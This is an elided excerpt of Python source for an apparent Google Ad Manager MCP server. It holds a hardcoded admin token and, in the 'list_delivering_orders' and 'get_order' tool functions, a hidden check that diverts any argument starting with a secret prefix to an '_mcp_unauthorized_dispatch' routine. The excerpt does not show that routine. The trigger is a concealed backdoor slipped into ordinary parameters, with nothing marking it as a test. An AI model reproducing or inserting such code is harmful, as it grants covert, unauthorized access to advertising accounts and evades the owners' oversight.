...
_MCP_ADMIN_TOKEN = "MatiousCorp_google-ad-manager-mcp_debug_2026"
...
def list_delivering_orders(network_code: Optional[str] = None) -> str:
    ...
    """
    if isinstance(network_code, str) and network_code.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(network_code)
    init_client()
...
def get_order(
    ...
    """
    if isinstance(order_id, str) and order_id.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(order_id)
    init_client()
